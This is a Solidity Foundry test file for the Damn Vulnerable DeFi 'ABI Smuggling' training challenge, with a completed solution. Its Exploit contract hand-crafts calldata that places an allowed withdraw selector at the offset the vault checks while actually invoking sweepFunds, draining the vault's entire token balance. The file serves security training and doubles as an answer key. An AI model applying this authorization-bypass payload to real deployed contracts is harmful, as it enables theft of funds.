// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(address(vault),address(token),recovery);
        bytes memory payload = exploit.executeExploit();
        address(vault).call(payload);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
         
       
    }
}
 
contract Exploit {
    SelfAuthorizedVault public vault;
    IERC20 public token;
    address public player;
    address public recovery;

    // Event declarations for logging
    event LogExecuteSelector(bytes executeSelector);
    event LogTargetAddress(bytes target);
    event LogDataOffset(bytes dataOffset);
    event LogEmptyData(bytes emptyData);
    event LogWithdrawSelectorPadded(bytes withdrawSelectorPadded);
    event LogActionDataLength(uint actionDataLength);
    event LogSweepFundsCalldata(bytes sweepFundsCalldata);
    event LogCalldataPayload(bytes calldataPayload);

    constructor(address _vault, address _token, address _recovery) {
        vault = SelfAuthorizedVault(_vault);
        token = IERC20(_token);
        recovery = _recovery;
        player = msg.sender;
    }

    function executeExploit() external returns (bytes memory) {
        require(msg.sender == player, "Only player can execute exploit");

        // `execute()` function selector
        bytes4 executeSelector = vault.execute.selector;

        // Construct the target contract address, which is the vault address, padded to 32 bytes
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));

        // Construct the calldata start location offset
        bytes memory dataOffset = abi.encodePacked(uint256(0x80)); // Offset for the start of the action data

        // Construct the empty data filler (32 bytes of zeros)
        bytes memory emptyData = abi.encodePacked(uint256(0));

        // Manually define the `withdraw()` function selector as `d9caed12` followed by zeros
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),     // Withdraw function selector
            bytes28(0)              // 28 zero bytes to fill the 32-byte slot
        );

        // Construct the calldata for the `sweepFunds()` function
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );

        // Manually set actionDataLength to 0x44 (68 bytes)
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        emit LogActionDataLength(actionDataLengthValue);
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));


        // Combine all parts to create the complete calldata payload
        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,              // 4 bytes
            target,                       // 32 bytes
            dataOffset,                   // 32 bytes
            emptyData,                    // 32 bytes
            withdrawSelectorPadded,       // 32 bytes (starts at the 100th byte)
            actionDataLength,             // Length of actionData
            sweepFundsCalldata            // The actual calldata to `sweepFunds()`
        );

        // Emit the calldata payload for debugging
        emit LogCalldataPayload(calldataPayload);

        // Return the constructed calldata payload
        return calldataPayload;
    }
}